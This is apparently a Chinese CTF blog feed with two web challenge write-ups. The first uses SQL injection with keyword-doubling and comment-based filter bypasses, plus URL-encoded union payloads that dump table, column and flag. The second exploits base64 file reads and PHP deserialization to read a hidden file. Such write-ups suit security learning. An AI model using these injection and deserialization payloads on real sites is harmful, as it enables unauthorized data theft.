    <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><h4 id="题目地址：http-139-199-182-61"><a href="#题目地址：http-139-199-182-61" class="headerlink" title="题目地址：http://139.199.182.61/"></a>题目地址：<a href="http://139.199.182.61/" target="_blank" rel="noopener">http://139.199.182.61/</a></h4><a id="more"></a>

<p>首先，刚进入这个所谓的留言板，注意到URL是<code>http://139.199.182.61/index.php?id=1</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/1.png" alt="1missing"></p>
<p>注意到id可以赋值，改成<code>id=2</code>,页面发生了变化。<br>我<strong><strong>*你个大</strong></strong>（bi<del>~</del>）！！！</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/2.png" alt="2missing"></p>
<p>再改成<code>id=3</code>，又变了一次。</p>
<p>从这儿可以判断<code>id</code>处，可以SQL注入，于是先查找内部的数据库，<code>id=union select database();#</code>,返回<code>id:uniondatabase();</code>,说明select和空格被过滤了。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/3.png" alt="3missing"></p>
<p>select过滤可以用<code>seleselectct</code>绕过。</p>
<p>空格绕过有两种方法：</p>
<p>一、通过注释<code>/**/</code>绕过。</p>
<p>二、通过括号<code>(1=0)</code>绕过。</p>
<p>现在爆数据库，构造payload：<code>id=&#39;/**/union/**/seleselectct/**/database();#</code>,发现没有结果</p>
<p>用URL编码payload：<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2fdatabase()%3b%23</code>,提交后返回结果<code>easysql</code>就是此题的数据库。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/4.png" alt="4missing"></p>
<p>接下来爆表名，构造payload：<code>id=&#39; union select table_name from information_schema.tables where table_schema=&#39;easysql&#39;;#</code>，对其修饰<code>id=&#39;/**/union/**/seleselectct/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;easysql&#39;;#</code>，再URL编码payload：<code>%27%2f**%2funion%2f**%2fseleselectct%2f**%2ftable_name%2f**%2ffrom%2f**%2finformation_schema.tables%2f**%2fwhere%2f**%2ftable_schema%3d%27easysql%27%3b%23</code>，返回表名<code>f1aggggggggggggg</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/5.png" alt="5missing"></p>
<p>然后爆字段名，构造payload：<code>id=&#39; union select column_name from information_schema.columns where table_name=&#39;f1aggggggggggggg&#39; and table_schema=&#39;easysql&#39;;#</code>，修饰<code>id=&#39;/**/union/**/seleselectct/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;f1aggggggggggggg&#39;/**/and/**/table_schema=&#39;easysql&#39;;#</code>，URL编码<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2fcolumn_name%2f**%2ffrom%2f**%2finformation_schema.columns%2f**%2fwhere%2f**%2ftable_name%3d%27f1aggggggggggggg%27%2f**%2fand%2f**%2ftable_schema%3d%27easysql%27%3b%23</code>，返回字段名<code>fl4444444g</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/6.png" alt="6missing"></p>
<p>最后就可以爆出<code>flag</code>了，构造payload：<code>id=&#39; union select fl4444444g from f1aggggggggggggg;#</code>，修饰<code>id=&#39;/**/union/**/seleselectct/**/fl4444444g/**/from/**/f1aggggggggggggg;#</code>，URL编码<code>id=%27%2f**%2funion%2f**%2fseleselectct%2f**%2ffl4444444g%2f**%2ffrom%2f**%2ff1aggggggggggggg%3b%23</code>，拿到flag：<code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code>。</p>
<p><img src="/2020/03/09/Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/7.png" alt="7missing"></p>
<hr>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>此题是一道简单的SQL注入题目，首先检测到id处可以进行注入，然后尝试各种注入找出被过滤的关键字，接下来找出绕过过滤的方法，然后根据<code>数据库  --&gt;  表  --&gt;  字段  --&gt;  内容</code>的顺序一步步找出flag！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF-杂题</tag>
      </tags>
  </entry>
  <entry>
    <title>神盾局的秘密</title>
    <url>/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    <content><![CDATA[<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><h4 id="题目地址：http-web-jarvisoj-com-32768"><a href="#题目地址：http-web-jarvisoj-com-32768" class="headerlink" title="题目地址：http://web.jarvisoj.com:32768"></a>题目地址：<a href="http://web.jarvisoj.com:32768" target="_blank" rel="noopener">http://web.jarvisoj.com:32768</a></h4><a id="more"></a>

<p>首先F12查看源码，发现<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p>
<p>进入Network中打开showimg.php?img=c2hpZWxkLmpwZw==，是一堆乱码，看见showing.php应该是文件包含类的题目。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/Network.png" alt="Network"></p>
<p>c2hpZWxkLmpwZw==是base64编码，解码后为shield.jpg，所以img查看的内容需要base64加密。</p>
<p>首先先查看showing.php，加密后为c2hvd2luZy5waHA=，payload <code>img=c2hvd2luZy5waHA=</code>，用<code>view-source</code>查看源码。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/showing.php.png" alt="showing.php"></p>
<p>对$f解码后过滤<code>..</code>，<code>/</code>，<code>\\</code>，<code>pctf</code></p>
<p>接着查看index.php的内容，加密aW5kZXgucGhw，payload <code>img=aW5kZXgucGhw+view-source</code>.</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/index.php.png" alt="index.php"></p>
<p>引入shield.php，有类名<code>Shield</code>,出现反序列化函数<code>unserialize</code>,目前还没有思路。</p>
<p>再看shield.php，加密c2hpZWxkLnBocA==，payload <code>img=c2hpZWxkLnBocA==</code> +<code>view-source</code>.</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/shield.php.png" alt="shield.php"></p>
<p>第一行说flag在<code>pctf.php</code>中，Shield类出现，也过滤了<code>..</code>,<code>/</code>,<code>\\</code>，没有过滤<code>pctf</code></p>
<p>由于前面showing.php中过滤了pctf，所以不能直接查看，所以利用反序列化漏洞。</p>
<p>开始写脚本。</p>
<pre><code>&lt;?php
//flag is in pctf.php
class Shield {
    public $file;
    function __construct($filename = &apos;&apos;) {
        $this -&gt; file = $filename;
    }

    function readfile() {
        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
            return @file_get_contents($this-&gt;file);
        }
    }
}

$ctf = new Shield(&apos;pctf.php&apos;);
echo serialize($ctf);
?&gt;</code></pre><p>得到序列化后的结果<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>,构造payload <code>?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>,F12后看到flag。</p>
<p><img src="/2020/03/09/%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/flag.png" alt="flag"></p>
<hr>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>此题是文件包含和反序列化类的题，首先要想到base64加密，之后查看各个php文件，得到线索，想办法查看pctf.php，showing.php都不通，只能在index.php中的序列化上下手。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF-杂题</tag>
      </tags>
  </entry>
</search>
